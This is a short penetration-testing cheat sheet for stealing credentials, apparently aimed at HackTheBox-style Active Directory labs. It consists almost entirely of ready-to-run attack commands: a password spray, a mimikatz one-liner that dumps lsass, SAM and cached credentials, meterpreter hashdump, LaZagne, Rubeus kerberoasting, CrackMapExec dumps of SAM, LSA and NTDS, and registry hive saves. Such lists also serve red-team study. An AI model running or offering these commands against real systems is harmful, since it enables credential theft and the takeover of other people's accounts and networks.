# Credentials

### <mark style="color:yellow;">Password Spray</mark>

```powershell
# Using kerberos auth
nxc ldap dc01.zencorp.htb -u comps.txt -p Zer0the0ne -k --continue-on-success
```

### <mark style="color:yellow;">Password retrieval</mark>

```powershell
# mimikatz
token::elevate
# Extract from lsass
sekurlsa::logonpasswords
# Extract from lsass
lsadump::lsa /inject
# Extract from SAM
lsadump::sam
# Oneliner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"

# Using meterpreter
hashdump
# Lazagne
./lazagne.exe -all
# Rubeus
./Rubeus.exe kerberoast /domain:zencorp.local /user:username /nowrap

# CrackMapExec SAM
crackmapexe smb 192.168.1.1 -u username -p password --sam
# CrackMapExec lsass
crackmapexe smb 192.168.1.1 -u username -p password --lsa
# CrackMapExec ntds
crackmapexe smb 192.168.1.1 -u username -p password --ntds-history

# Copy manually
reg save HKLM\sam sam
reg save HKLM\system system
```
